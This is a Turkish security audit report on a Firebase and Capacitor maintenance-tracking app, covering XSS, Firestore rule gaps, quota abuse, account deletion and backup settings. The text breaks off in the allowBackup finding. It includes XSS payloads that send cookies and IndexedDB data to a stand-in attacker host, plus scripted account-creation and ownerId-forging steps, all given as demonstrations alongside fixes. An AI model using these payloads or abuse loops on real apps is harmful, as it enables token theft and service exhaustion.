# Bakım Takip — Güvenlik Denetim Raporu

**Denetlenen sürüm:** `bakim-takip-mobile` (www/ + android/), 2026-08-21
**Kapsam:** `www/app.js`, `www/firebase-adapter.js`, `www/firebase-config.js`, `www/index.html`,
`firestore.rules`, `firestore.indexes.json`, `firebase.json`, `android/app/src/main/AndroidManifest.xml`,
`android/app/build.gradle`, `android/variables.gradle`, `android/app/src/main/res/xml/*`,
`capacitor.config.json`
**Referans:** `C:\Users\tugru\repos\arac-masraf-takip\docs\security-notes.md` (mimari gereksinim dokümanı)

---

## Yönetici özeti

| Önem | Adet |
|---|---|
| Kritik | 0 |
| Yüksek | 4 |
| Orta | 6 |
| Düşük | 5 |
| Bilgi / doğrulanamadı | 3 |

**Kritik bulgu yok** — ve bu bilinçli bir değerlendirme, kibarlık değil. Denetimde
*kullanıcılar arası veri okuma* (bir kullanıcının başka bir kullanıcının araç/masraf/bakım
verisini görebilmesi) senaryosu **bulunamadı**. `firestore.rules` okuma tarafında
`resource.data.ownerId == request.auth.uid` şartını her koleksiyonda doğru kuruyor ve
`www/firebase-adapter.js` içindeki tüm sorgular buna uyumlu `where('ownerId','==',uid())`
filtresi taşıyor. `create` kurallarında `ownerId` spoofing de doğru şekilde engellenmiş
(detay: **§3.1**). Bunlar doğru yapılmış.

Buna karşılık dört adet **Yüksek** bulgu var: sistemik XSS yüzeyi, App Check + e-posta
doğrulama + yazma validasyonunun hep birlikte yokluğundan doğan sınırsız yazma/kota
tükenmesi riski, `expenses` güncelleme kuralında kardeş kurallarla **tutarsız** bir
`ownerId` değişmezlik eksiği, ve hesap silme akışının hiç olmaması (mağaza yayın engeli).

---

## Doğru yapılmış olanlar (bulgu değil, teyit)

Raporun geri kalanının güvenilir olması için önce neyin **doğru** olduğunu tespit ediyorum:

1. **`ownerId` spoofing engellenmiş.** `firestore.rules:36`, `:48`, `:58` — üç `create`
   kuralı da `request.resource.data.ownerId == request.auth.uid` kontrolü yapıyor.
   İstemci `ownerId` alanını *gönderiyor* ama *istediği değeri veremiyor*.
2. **Alt koleksiyon `create`'lerinde üst araç sahipliği doğrulanıyor.**
   `firestore.rules:50-51` ve `:60-61` — `get(/databases/$(database)/documents/vehicles/$(vehicleId)).data.ownerId == request.auth.uid`.
   Başkasının aracının altına masraf/parça yazılamaz.
3. **Sorgu/kural tutarlılığı sağlanmış.** `firebase-adapter.js:93`, `:103`, `:134`, `:193`,
   `:243` — her sorguda `where('ownerId','==',uid())` var. `firebase-adapter.js:88-92`'deki
   yorum bu zorunluluğun *neden* var olduğunu doğru açıklıyor.
4. **Cleartext trafik kapalı.** `AndroidManifest.xml` içinde `android:usesCleartextTraffic`
   **hiç yok** → `targetSdkVersion = 36` (`android/variables.gradle:4`) olduğu için Android
   varsayılanı `false`. `capacitor.config.json` içinde `server` bloğu yok → Capacitor 8
   Android'de varsayılan `https://localhost` şemasını kullanır. Bu doğru yapılandırma.
5. **`exported="true"` olan tek activity `MainActivity`'dir ve bu zorunludur.**
   `AndroidManifest.xml:18-23` — `MAIN`/`LAUNCHER` intent-filter'ı olan bir activity
   `exported="true"` olmak **zorundadır**, aksi halde uygulama açılmaz. Başka
   intent-filter, deep link, `<data>` şeması veya exported service/receiver yok.
   **Burada bulgu yok** — uydurulacak bir şey de yok.
6. **`FileProvider` `exported="false"`.** `AndroidManifest.xml:30`. Doğru.
7. **Şifre sıfırlamada enumeration koruması.** `app.js:154-157` — hata yutuluyor, her
   durumda aynı jenerik mesaj gösteriliyor. `security-notes.md:91-92` ile uyumlu.
8. **Giriş hatalarında enumeration koruması.** `app.js:66-67` — `auth/user-not-found` ve
   `auth/wrong-password` aynı metne map'lenmiş ("E-posta veya şifre hatalı").
9. **`parts` güncelleme kuralı gerçekten çalışıyor.** Manuel simüle edildi, sonuç: **§3.2**.
10. **`notifications` kuralı sıkı yazılmış.** `firestore.rules:26-29` —
    `diff().affectedKeys().hasOnly(['readAt'])` ile sadece okundu işaretlemeye izin, create/delete
    tamamen kapalı.

---

# YÜKSEK ÖNEM BULGULAR

## Y-1 — `innerHTML` şablonlarında sistemik HTML enjeksiyonu (XSS)

**Önem derecesi:** Yüksek
**Nerede:** `www/app.js` — tüm render fonksiyonları. Doğrulanmış enjeksiyon noktaları:

| Satır | Bağlam | Kaçırılmayan değer |
|---|---|---|
| `app.js:171` | `<option>` içeriği | `v.brand`, `v.model` |
| `app.js:223` | `<div class="pbrand">` | `ap.brand` (parça markası) |
| `app.js:233` | `<span class="hparts">` | `p.name` (serbest parça adı) |
| `app.js:239` | `<h2>`, `<p>` | `v.brand`, `v.model`, `v.year`, `v.engine` |
| `app.js:244` | `<span class="ename">` | parça adı |
| `app.js:271-273` | `<span>` × 3 | `w.vehicleLabel`, `w.itemLabel`, `w.message` |
| `app.js:304` | `<h2>` | `v.brand`, `v.model` |
| **`app.js:322`** | **`value="…"` — HTML attribute** | **`existing?.brand`** |
| **`app.js:325`** | **`<textarea>` içi** | **`log?.notes`** |
| **`app.js:343-348`** | **`value="…"` + `<textarea>`** | **`exp?.date`, `exp?.amount`, `exp?.km`, `exp?.due_date`, `exp?.notes`** |
| **`app.js:378`** | **`value="…"` × 3** | **`prefill?.name`, `prefill?.brand`, `prefill?.cost`** |
| **`app.js:415`** | **`<span class="ptag">` + `<div class="lnotes">`** | **`p.name`, `p.brand`, `l.notes`** |
| **`app.js:450`** | **`<span class="ptag">` + `<div class="lnotes">`** | **`e.due_date`, `e.notes`** |
| `app.js:482` | `<h3>`, `<p>` | `v.brand`, `v.model`, `v.year`, `v.engine` |
| `app.js:556` | `<p>` | `user.email` |
| `app.js:56`, `:248`, `:417`, `:462` | `<div class="err-msg">` | `e.message` |

Bu değerlerin hiçbiri kaçırılmıyor. Kod tabanında `escapeHtml`, `textContent` tabanlı bir
render yardımcısı veya herhangi bir sanitizasyon **yok** (arandı, bulunamadı).

**Sorun ne**

Tüm ekranlar `el.innerHTML = \`…${kullanıcıVerisi}…\`` kalıbıyla üretiliyor. Kullanıcının
serbestçe girdiği her alan (araç markası/modeli/motoru, parça markası, serbest parça adı,
notlar) tarayıcıya **HTML olarak** veriliyor.

İki farklı bağlam, iki farklı kaçış senaryosu:

- **Element bağlamı** (`app.js:415`, `:450` — `<div class="lnotes">${l.notes}</div>`):
  payload doğrudan etiket olarak yorumlanır.
- **Attribute bağlamı** (`app.js:322`, `:343-348`, `:378` — `value="${…}"`): payload çift
  tırnağı kapatıp yeni attribute enjekte edebilir. Bu ikisi ayrı ayrı düzeltilmeli.

**Nasıl istismar edilir (somut senaryo)**

*Senaryo A — attribute bağlamı, `app.js:322`.* Bir bakım kaydında "Motor Yağı" parçasının
"Marka / Not" alanına şu girilir:

```
" autofocus onfocus="fetch('https://saldirgan.example/x?d='+encodeURIComponent(JSON.stringify(await indexedDB.databases())))
```

Kayıt edilir. Kullanıcı o kaydı **Düzenle** ile tekrar açtığında `renderMaintForm`
şu HTML'i üretir:

```html
<input type="text" class="binput" placeholder="Marka / Not" value="" autofocus onfocus="fetch(...)">
```

`autofocus` sayesinde `onfocus` render anında tetiklenir. Kullanıcı hiçbir şeye tıklamaz.

*Senaryo B — element bağlamı, `app.js:415`.* Bakım kaydının "Notlar" alanına:

```html
<img src=x onerror="location='https://saldirgan.example/?t='+document.cookie">
```

"Geçmiş" ekranı her açıldığında çalışır.

**Önemli teknik ayrıntı:** `innerHTML` ile eklenen `<script>` etiketleri **çalışmaz** —
bu yüzden `<script>` denemesi başarısız olur ve sorun "yok" sanılabilir. Ancak
`<img onerror>`, `<svg onload>`, `<iframe srcdoc>`, `<body onload>` ve `autofocus`+`onfocus`
kombinasyonu **çalışır**. Bu bulguyu "test ettim, script çalışmıyor" diye kapatmayın.

**Etki neden yine de "Kritik" değil?**

Bugünkü veri modelinde kullanıcı **yalnızca kendi verisini** okuyabiliyor (kurallar ve
sorgular bunu doğru sağlıyor — bkz. §Doğru yapılmış olanlar). Yani payload'ı yazan da
okuyan da aynı kişi → pratikte *self-XSS*. Başka bir kullanıcıya payload ulaştıracak bir
kanal **şu an yok**: araç paylaşımı özelliği yok, ve yedekten geri yükleme
`firebase-adapter.js:312-318`'de bilinçli olarak `throw` ediyor (henüz uygulanmamış).

**Ama bu durum kalıcı değil ve üç şekilde Kritik'e döner:**

1. **Yedekten geri yükleme uygulandığı an** (`app.js:571-577` düğmesi zaten UI'da duruyor)
   → dışarıdan gelen bir JSON dosyasındaki `notes` alanı doğrudan render'a girer. Bu, tam
   anlamıyla "güvenilmeyen girdiden kod çalıştırma"dır.
2. **Araç paylaşımı / çoklu kullanıcı** eklenirse doğrudan kullanıcılar arası XSS olur.
3. **Bugün bile gerçek bir zarar var:** payload Capacitor WebView içinde `https://localhost`
   origin'inde, uygulamanın tam yetkisiyle çalışır. Firebase Auth'un **refresh token'ı**
   aynı origin'in IndexedDB'sinde durur. Zararlı bir "marka" değeri (ör. kullanıcının
   internetten kopyaladığı bir metinle) tek seferde token'ı dışarı sızdırabilir → kalıcı
   hesap ele geçirme.

**Ek olarak — bu aynı zamanda bir doğruluk hatası.** XSS'i bir kenara bıraksak bile,
notuna `<` yazan veya markası `A&B` olan bir kullanıcı ekranı bozar. `3 < 5 bar basınç`
gibi masum bir not, `lnotes` div'inin kalanını yutar.

**Nasıl düzeltilir**

`www/app.js` en üstüne tek bir yardımcı ekleyin ve **istisnasız** her interpolasyonu sarın:

```js
function esc(s){
  return String(s ?? '').replace(/[&<>"']/g, c => (
    {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]
  ));
}
```

Sonra örneğin `app.js:415`:

```js
${l.notes ? `<div class="lnotes">${esc(l.notes)}</div>` : ''}
```

ve `app.js:322`:

```js
value="${esc(existing?.brand||'')}"
```

Uygulama kuralları:

- **Sayısal alanları da sarın** (`amount`, `km`, `cost`). Bunlar Firestore'dan geliyor ve
  Firestore'da tip garantisi yok — kurallarda alan tipi doğrulanmıyor (bkz. **Y-2**).
- **`onclick="…('${id}')"` kalıbını `esc()` ÇÖZMEZ** (`app.js:269`, `:415`, `:450`, `:482`).
  Burası JavaScript bağlamı; `esc()` tırnağı `&#39;` yapar ama HTML attribute'u parse
  edilirken tekrar `'` olur. Bugün güvenli, çünkü oraya sadece Firestore otomatik doküman
  ID'leri (`[A-Za-z0-9]{20}`) giriyor. Yine de kırılgan bir kalıp: orta vadede
  `data-id="…"` + `addEventListener` deseni ile değiştirin.
- **Kalıcı çözüm:** metin düğümü için `el.textContent`, form değerleri için `el.value`
  kullanan küçük bir render yardımcısı. `showEditVehicle` (`app.js:506-511`) zaten
  `.value=` kullanıyor ve doğru — aynı disiplini diğer formlara taşıyın.

---

## Y-2 — App Check yok + e-posta doğrulama zorlanmıyor + yazma validasyonu yok → sınırsız hesap ve sınırsız yazma

**Önem derecesi:** Yüksek (üç eksiğin birleşiminden doğuyor; tek tek Orta'dır)
**Nerede:**
- `www/firebase-config.js:9` — gerçek API key (`AIzaSyDqhx98…`)
- Kod tabanının tamamı — **App Check referansı yok** (arandı: `appcheck`, `app-check`,
  `PlayIntegrity`, `ReCaptcha` → hiçbiri yok)
- `firestore.rules` — **hiçbir yerde `request.auth.token.email_verified` yok**
- `www/app.js:52-58` (`init`) — sadece `if(!user)` kontrolü; `user.emailVerified` **hiç okunmuyor**
- `firestore.rules:35-36`, `:47-51`, `:57-61` — `create` kurallarında alan/tip/boyut validasyonu yok

**Sorun ne**

`firebase-config.js:2-4`'teki yorum doğru: Firebase web API key'i bir sır değildir, gerçek
güvenlik Security Rules ile sağlanır. **Ama bu ifade sadece kurallar sıkıysa doğrudur.**
Burada üç kapı birden açık:

1. **API key APK'dan düz metin olarak çıkarılır.** `unzip app-debug.apk` →
   `assets/public/firebase-config.js`. Obfuscation yok (`build.gradle:21` `minifyEnabled false`,
   ayrıca ProGuard zaten JS asset'lerine dokunmaz).
2. **App Check yok** → bu key ile atılan istekler "gerçekten sizin uygulamanızdan mı
   geliyor" diye doğrulanmaz. Herkes Identity Toolkit ve Firestore REST API'ye doğrudan
   `curl`/script atabilir. `security-notes.md:73-77` bunu zaten şart koşmuş:
   *"App Check olmadan 'rate limiting var' demeyin."*
3. **E-posta doğrulama hiçbir yerde zorlanmıyor.** `firebase-adapter.js:329`
   `sendEmailVerification()` çağrılıyor — yani doğrulama maili **gönderiliyor** — ama
   `emailVerified` değeri ne UI'da (`app.js:52-58`) ne de kurallarda kontrol ediliyor.
   `security-notes.md:32-36` bunu açıkça zorunlu tutmuş:
   *"Doğrulanmamış hesap uygulamayı kullanabilir ama veri yazamaz: bu kontrol Security
   Rules tarafında `request.auth.token.email_verified == true` ile server-side uygulanır."*
   **Bu gereksinim uygulanmamış.**
4. **`create` kurallarında alan validasyonu yok.** Kurallar sadece `ownerId` ve `vehicleId`
   alanlarına bakıyor. Doküman kaç alan içeriyor, alanlar hangi tipte, string'ler ne kadar
   uzun — hiçbiri denetlenmiyor. Firestore doküman başına 1 MB'a izin verir.

**Nasıl istismar edilir (somut senaryo)**

APK'dan çıkarılan key ile, tarayıcı/uygulama olmadan, düz bir script:

```
1. POST identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyDqhx98…
   → sahte@nerede.olsa.com / herhangi bir şifre ile hesap açılır.
   E-posta doğrulaması gerekmez (kurallarda kontrol yok), CAPTCHA yok (App Check yok).
   → idToken elde edilir.
2. Bu idToken ile POST firestore.googleapis.com/.../documents/vehicles
   { ownerId: <yeni uid>, brand: "<900 KB dolgu>" , model: "x" }
   → Kural geçer: ownerId == request.auth.uid ✓ . Başka hiçbir şey denetlenmez.
3. 1 ve 2'yi döngüye alın.
```

**Somut etki:** Proje şu an **Spark (ücretsiz) planında** (`app.js:207-209`'daki yorumda
bu açıkça yazıyor). Spark planında günlük yazma kotası **20.000 yazma / 50.000 okuma**
ile sınırlıdır. Yukarıdaki script bu kotayı **dakikalar içinde** tüketir → o gün için
**gerçek kullanıcılar uygulamayı kullanamaz** (tüm okuma/yazma `RESOURCE_EXHAUSTED`
döner). Yani bu, tüm ürünü düşüren bir hizmet-dışı bırakma senaryosudur.
Blaze (ücretli) plana geçildiğinde ise aynı senaryo **doğrudan faturaya** dönüşür.

İkincil etki: `sendEmailVerification` doğrulanmamış adreslere mail gönderdiği için,
üçüncü kişilerin adresleriyle toplu kayıt açılarak proje adına istenmeyen e-posta
gönderilebilir (Firebase'in günlük mail kotası da tükenir → gerçek kullanıcılar şifre
sıfırlama maili alamaz).

**Nasıl düzeltilir** (öncelik sırasıyla)

1. **App Check'i kurun** — Android'de Play Integrity sağlayıcısı.
   `security-notes.md:78-82`'deki sırayı izleyin: **önce monitoring modu**, metrikler
   temizlendikten sonra enforcement. Doğrudan enforcement açmak mevcut kullanıcıları
   kilitler. Debug build için ayrı debug provider yapılandırın, debug token'ı prod
   projesine eklemeyin.
2. **Kurallarda `email_verified` zorunlu kılın.** Yardımcı fonksiyonu şöyle güncelleyin:

   ```js
   function isVerified() {
     return request.auth != null && request.auth.token.email_verified == true;
   }
   ```

   ve tüm `create`/`update`/`delete` kurallarında `isSignedIn()` yerine `isVerified()`
   kullanın. **`read` için `isSignedIn()` kalsın** — doğrulanmamış kullanıcı verisini
   görebilsin ama yazamasın (mevcut kullanıcıları kilitlememek için).
3. **UI tarafını buna hazırlayın.** `security-notes.md:37-40`'taki tuzak gerçek:
   `email_verified` claim'i ID token'a gömülüdür; kullanıcı doğruladıktan sonra elindeki
   token hâlâ eskidir. `app.js:52-58`'de `user.emailVerified === false` ise "E-postanı
   doğrula" ekranı gösterin, "Doğruladım" düğmesi `currentUser.reload()` +
   `getIdToken(true)` çağırsın. Aksi halde "doğruladım ama kaydetmiyor" hatası alırsınız.
4. **`create` kurallarına alan validasyonu ekleyin.** Örnek (`vehicles`):

   ```js
   allow create: if isVerified()
     && request.resource.data.ownerId == request.auth.uid
     && request.resource.data.keys().hasOnly(
          ['ownerId','brand','model','year','engine','purchase_km','current_km','created_at'])
     && request.resource.data.brand is string && request.resource.data.brand.size() <= 60
     && request.resource.data.model is string && request.resource.data.model.size() <= 60
     && request.resource.data.current_km is int
     && request.resource.data.current_km >= 0
     && request.resource.data.current_km <= 5000000;
   ```

   Aynı disiplini `expenses` (`amount`, `notes` uzunluğu) ve `parts` için de uygulayın.
   Bu hem kota istismarını hem de **Y-1**'deki payload'ların boyutunu sınırlar.
5. **API key kısıtlaması** — bkz. **B-2**.

> **Not:** Bu bulgu, denetimdeki en "Kritik'e yakın" maddedir. Yüksek olarak
> derecelendirilmesinin tek sebebi, saldırganın önce (kolayca) bir hesap açmak zorunda
> olmasıdır. Gizlilik ihlali değil, kullanılabilirlik/maliyet ihlalidir.

---

## Y-3 — `expenses` güncelleme kuralında `ownerId` değişmezliği eksik (kardeş kurallarla tutarsız)

**Önem derecesi:** Yüksek
**Nerede:** `firestore.rules:44-45`

```js
match /vehicles/{vehicleId}/expenses/{expenseId} {
  allow read, update, delete: if isSignedIn()
    && resource.data.ownerId == request.auth.uid;   // ← sadece MEVCUT dokümana bakıyor
  …
}
```

**Sorun ne**

Bu kural yalnızca `resource.data` (güncelleme **öncesi** doküman) üzerinden yetki veriyor.
`request.resource.data` (güncelleme **sonrası** doküman) hiç denetlenmiyor. Yani bir
kullanıcı kendi masraf kaydını güncellerken `ownerId` alanını **başka birinin uid'si
yapabilir.**

Bunun bir gözden kaçma olduğu, aynı dosyadaki kardeş kurallardan belli:

- `firestore.rules:41` (`vehicles`): `request.resource.data.ownerId == resource.data.ownerId` ✓ **var**
- `firestore.rules:67` (`parts`): `request.resource.data.ownerId == resource.data.ownerId` ✓ **var**
- `firestore.rules:44` (`expenses`): ✗ **YOK**

Aynı şekilde `expenses` `update` kuralı `vehicleId` alanını da korumuyor
(`create` kuralı `firestore.rules:49`'da koruyor, `update` korumuyor).

**Nasıl istismar edilir (somut senaryo)**

Saldırgan kendi hesabıyla giriş yapar (Y-2 sayesinde bu bedava ve doğrulamasızdır),
kendi aracına bir masraf kaydı ekler, sonra o kaydı doğrudan SDK ile günceller:

```js
await updateDoc(doc(db,'vehicles', BENIM_ARAC_ID, 'expenses', BENIM_MASRAF_ID), {
  ownerId: 'KURBAN_UID',
  amount: 999999,
  notes: 'sahte kayıt'
});
// Kural: resource.data.ownerId == request.auth.uid  → ✓ (henüz benim)
// request.resource.data.ownerId hiç kontrol edilmiyor → YAZIM BAŞARILI
```

Doküman artık saldırganın aracının altında ama **kurbanın uid'siyle damgalı**.

İki somut sonuç:

1. **Sunucu tarafı toplamalara veri enjeksiyonu.** `firestore.indexes.json` içinde
   `expenses` için `ownerId + category + date` alanlı bir **COLLECTION_GROUP indeksi**
   tanımlı. Bu indeks, `ownerId`'ye göre toplu tarama yapan bir Admin SDK / Cloud
   Function için hazırlanmış. Böyle bir fonksiyon yazıldığı anda (rapor, aylık özet,
   bildirim) saldırgan kurbanın toplamlarına istediği kaydı sokabilir. *(Not: istemci
   tarafından `collectionGroup()` sorgusu şu an zaten reddedilir — bkz. **B-3**.)*
2. **Silinemeyen yetim doküman.** `ownerId` değiştikten sonra saldırgan bile o dokümanı
   okuyamaz/silemez. Dahası `firebase-adapter.js:126` araç silerken
   `deleteAllDocs(query(..., where('ownerId','==',uid())))` kullandığı için planted
   doküman **atlanır**, ardından `firebase-adapter.js:128` üst araç dokümanını siler.
   Sonuç: veritabanında hiçbir kullanıcının erişemeyeceği, uygulamanın hiçbir zaman
   temizleyemeyeceği kalıcı çöp doküman. Bunu bilerek üreten biri, sınırsız sayıda
   üretebilir (kota/maliyet, Y-2 ile birleşir).

**Nasıl düzeltilir**

`firestore.rules:44-45`'i kardeşleriyle aynı hizaya getirin — `update`'i ayırıp
değişmezlik kontrolü ekleyin:

```js
match /expenses/{expenseId} {
  allow read, delete: if isSignedIn()
    && resource.data.ownerId == request.auth.uid;

  allow update: if isSignedIn()
    && resource.data.ownerId == request.auth.uid
    && request.resource.data.ownerId  == resource.data.ownerId
    && request.resource.data.vehicleId == resource.data.vehicleId;

  allow create: if isSignedIn()
    && request.resource.data.ownerId == request.auth.uid
    && request.resource.data.vehicleId == vehicleId
    && get(/databases/$(database)/documents/vehicles/$(vehicleId)).data.ownerId
       == request.auth.uid;
}
```

Bu değişiklik mevcut istemci kodunu **bozmaz**: `firebase-adapter.js:224` ve `:180`
zaten `updateDoc`/`batch.update` ile kısmi güncelleme yapıyor ve `ownerId`/`vehicleId`
göndermiyor → merge sonucu bu alanlar değişmiyor → yeni kural geçer.

**Genel kural olarak:** `ownerId` içeren her `update` kuralında değişmezlik kontrolü
olmalı. Bu üç koleksiyonda da aynı kalıp kullanılmalı; birinde olup diğerinde olmaması
tam olarak bu tür hataların kaynağı.

---

## Y-4 — Hesap silme akışı yok (mağaza yayın engeli + KVKK yükümlülüğü)

**Önem derecesi:** Yüksek
**Nerede:**
- `www/app.js:545-559` (`renderSettings`) — Ayarlar ekranında yalnızca "Yedek Al",
  "Yedekten Geri Yükle" ve "Çıkış Yap" var. **Hesap silme yok.**
- `firestore.rules:12` — `allow delete: if false; // hesap silme ayrı bir akışla (Cloud Function) yönetilecek`
- **Cloud Function yok** — projede `functions/` dizini yok, `firebase.json` içinde
  `functions` anahtarı yok (yalnızca `firestore` var).
- `www/firebase-adapter.js:322-337` (`window.authApi`) — `deleteUser` / `reauthenticate`
  fonksiyonu yok.

**Sorun ne**

`security-notes.md:309-320` bunu **"iyi olurdu maddesi değil, yayın engeli"** olarak
işaretlemiş ve gereksinimleri saymış. Hiçbiri karşılanmamış:

| Gereksinim (`security-notes.md`) | Durum |
|---|---|
| Uygulama içi silme akışı (`:315`) | ✗ Yok |
| Uygulama dışı web bağlantısı (`:316-318`) | ✗ Yok |
| Silme öncesi yeniden kimlik doğrulama (`:322`) | ✗ Yok |
| Auth + **tüm Firestore verisi** silinmeli (`:325-327`) | ✗ Yok |
| Cloud Function ile yapılmalı (`:328-329`) | ✗ Yok |
| Silme talebi kaydı tutulmalı (`:330-331`) | ✗ Yok |

Ayrıca **hiçbir gizlilik politikası / KVKK aydınlatma metni de yok** (kod tabanında
`gizlilik`, `privacy`, `kvkk`, `aydınlatma` arandı → hiç geçmiyor).

**Nasıl istismar edilir**

Bu klasik anlamda "istismar edilen" bir açık değil; **uyum ve veri saklama riski**:

1. **Google Play, hesap oluşturmaya izin veren uygulamalarda hesap silme imkânını
   zorunlu tutar.** Bu haliyle uygulama **yayına kabul edilmez** (ya da yayındaysa
   kaldırılır). Aynısı App Store için de geçerli.
2. Kullanıcı uygulamayı silse bile e-postası, adı, tüm araç kilometreleri ve harcama
   tutarları Firestore'da **süresiz kalır**. KVKK bakımından bu, "işleme amacı ortadan
   kalktığında silme" yükümlülüğünün ihlalidir ve kullanıcı talebi geldiğinde yerine
   getirilecek hiçbir teknik mekanizma yoktur.
3. `firestore.rules:12` `allow delete: if false` doğru yazılmış (istemcinin yarım silme
   yapmasını engelliyor) ama karşılığındaki Cloud Function hiç yazılmamış → kapı hem
   istemciye hem sunucuya kapalı.

**Nasıl düzeltilir**

1. **Ayarlar'a "Hesabımı Sil" ekleyin** (`app.js:545-559` içine, "Çıkış Yap"ın altına,
   kırmızı/`btn-d` stilinde ve ne silineceğini açıkça yazan bir onay metniyle).
2. **Silmeden önce yeniden kimlik doğrulayın** —
   `reauthenticateWithCredential(user, EmailAuthProvider.credential(email, password))`.
   Firebase, son girişten uzun süre geçmişse `auth/requires-recent-login` döner; bu akış
   olmadan silme çalışmaz.
3. **Sunucu tarafı cascade silme için bir Cloud Function yazın.** İstemci sadece
   `users/{uid}/deletionRequests` benzeri bir doküman oluştursun (veya bir callable
   function çağırsın); function Admin SDK ile şu sırayla temizlesin:
   `vehicles/{v}/parts/*` → `vehicles/{v}/expenses/*` → `vehicles/*` →
   `users/{uid}/fcmTokens/*` → `notifications` (ownerId == uid) → `users/{uid}` →
   son olarak `admin.auth().deleteUser(uid)`. Talebin başlangıç/bitiş zamanını ayrı bir
   log koleksiyonunda tutun (`security-notes.md:330-331`).
   *Not: Cloud Functions **Blaze planı** gerektirir. `app.js:207-209` projenin Spark'ta
   olduğunu belirtiyor. Bu, yayına çıkmadan önce alınması gereken bir plan kararıdır.*
4. **Play Console → "Data deletion" alanına bir web bağlantısı** girin (uygulamayı
   silmiş kullanıcı da talebini iletebilmeli).
5. **Gizlilik politikası + KVKK aydınlatma metni** hazırlayın ve uygulama içinden
   erişilebilir kılın (Ayarlar'da bir bağlantı). `security-notes.md:333-362`'de
   çerçevesi var; yayın öncesi bir hukukçuya danışın.

---

# ORTA ÖNEM BULGULAR

## O-1 — `parts` koleksiyonunda korumalı alanlar `create` sırasında korumasız

**Önem derecesi:** Orta
**Nerede:** `firestore.rules:57-61` (`create`) ve `:65-69` (`update`)

**Kuralın manuel simülasyonu** (görev bunu özellikle istedi):

`update` kuralı **doğru çalışıyor.** `firestore.rules:68-69`:

```js
&& !request.resource.data.diff(resource.data).affectedKeys()
     .hasAny(['remainingKm','remainingMonths','status','notifiedStatus'])
```

`diff().affectedKeys()` **eklenen, silinen ve değeri değişen** anahtarları döndürür.
Üç senaryoyu tek tek geçtim:

| Senaryo | `affectedKeys()` içerir mi? | Sonuç |
|---|---|---|
| Alan yok, istemci eklemeye çalışıyor | **Evet** (eklenen anahtar) | ✓ **Reddedilir** |
| Alan var, istemci değeri değiştiriyor | **Evet** (değişen anahtar) | ✓ **Reddedilir** |
| Alan var, istemci aynı değeri gönderiyor | Hayır | İzin verilir (no-op, zararsız) |

**Yani `update` tarafı sağlam.** Ancak:

**Sorun ne:** `create` kuralı (`firestore.rules:57-61`) bu alanlara **hiçbir kısıt
koymuyor**. Sadece `ownerId`, `vehicleId` ve üst araç sahipliği denetleniyor.
`firestore.rules:63-64`'teki yorum *"remainingKm/remainingMonths/status/notifiedStatus
client'tan asla değişmemeli"* diyor — ama bu, **yalnızca `update` için** sağlanmış.
Yeni doküman oluştururken istemci bu alanları istediği değerle yazabilir.

Ve `firebase-adapter.js`'teki gerçek yazma yolu **her zaman yeni doküman açar**:
`writePartChanges` (`firebase-adapter.js:65`) `doc(collection(...))` ile yeni ref üretip
`batch.set(newPartRef, {...})` yapıyor — bu bir **create**'tir, `update` değil. Yani
uygulamanın normal akışı bile kuralın korumasız tarafından geçiyor.

*(Teyit: mevcut istemci bu alanları **yazmıyor** — `firebase-adapter.js:71-81` yalnızca
`vehicleId, ownerId, partTypeId, partTypeLabel, brand, installedAtKm, installedAtDate,
expectedLifeKm, partCost, relatedExpenseId, isActive, replacedByPartId, created_at`
yazıyor. Yani bu **şu an istismar edilen değil, açık bırakılmış** bir kapı.)*

**Nasıl istismar edilir (somut senaryo)**

`firestore.indexes.json` içinde `parts` için `ownerId + status + remainingKm` alanlı bir
COLLECTION_GROUP indeksi tanımlı — yani ileride bir Cloud Function'ın `status`'a göre
tarayıp FCM bildirimi göndermesi planlanmış (`app.js:207-209` bunu doğruluyor). O function
yazıldığında:

```js
// Kendi aracımın altına, elle:
await setDoc(doc(collection(db,'vehicles',BENIM_ARAC,'parts')), {
  ownerId: BENIM_UID, vehicleId: BENIM_ARAC,   // ✓ kural geçer
  partTypeId:'triger', partTypeLabel:'Triger Kayışı',
  isActive:true, installedAtKm:0, expectedLifeKm:60000,
  status:'overdue', remainingKm:-9999999, notifiedStatus:null   // ← hiç denetlenmiyor
});
```

- `remainingKm: -9999999` → bildirim kuyruğunun en başına sıralanır (indeks
  `remainingKm ASC`), tek kullanıcı bildirim işini domine eder.
- Tersi de mümkün: **`notifiedStatus:'overdue'`** ile açılan bir doküman, gerçek bir
  uyarının "zaten bildirildi" sayılıp **hiç gönderilmemesine** yol açar. Bu, bakım takip
  uygulamasında sessizce kaçırılan bir triger kayışı uyarısı demektir.

**Nasıl düzeltilir**

`create` kuralına da aynı yasağı ekleyin:

```js
allow create: if isSignedIn()
  && request.resource.data.ownerId == request.auth.uid
  && request.resource.data.vehicleId == vehicleId
  && !request.resource.data.keys()
        .hasAny(['remainingKm','remainingMonths','status','notifiedStatus'])
  && get(/databases/$(database)/documents/vehicles/$(vehicleId)).data.ownerId
     == request.auth.uid;
```

`update` kuralındaki `diff().hasAny()` kalıbını **değiştirmeyin** — o doğru çalışıyor.
Ayrıca `firestore.rules:63-64`'teki yorumu güncelleyin ki bir sonraki okuyan kapsamın
sadece `update` olduğunu sanmasın.

---

## O-2 — `android:allowBackup="true"` → Firestore önbelleği ve Auth refresh token'ı yedeklenebiliyor

**Önem derecesi:** Orta
**Nerede:** `android/app/src/main/AndroidManifest.xml:5`

```xml
<application android:allowBackup="true" …>
```

**Sorun ne**

Bu, Capacitor şablonunun varsayılanı ve değiştirilmemiş. Sonucu: uygulamanın tüm özel veri
dizini (`/data/data/com.bakim.takip.mobile/`) Android'in yedekleme mekanizmalarına dahil
olur. Bu dizinde ne var?

1. **Firestore kalıcı önbelleği.** `firebase-adapter.js:29`
   `initializeFirestore(app, { localCache: persistentLocalCache() })` → kullanıcının tüm
   araçları, kilometreleri, masraf tutarları ve notları IndexedDB'de **şifresiz** durur.
2. **Firebase Auth refresh token'ı.** Auth kalıcılığı da aynı origin'in IndexedDB'sindedir.
   Bu token, şifre olmadan yeni ID token üretmeye yarar — yani **hesabın kendisi**.

`android:dataExtractionRules` (Android 12+) veya `android:fullBackupContent` ile bir
istisna listesi de tanımlanmamış → her şey yedeğe girer.

**Nasıl istismar edilir (somut senaryo)**

- **Google otomatik yedekleme:** Veri, kullanıcının Google Drive'ına (uygulama başına
  25 MB) kopyalanır. Refresh token'ın buluta çıkması, hesabın cihaz dışında bir yerde
  daha durması demektir. Kullanıcı yeni bir telefona geçtiğinde token geri yüklenebilir.
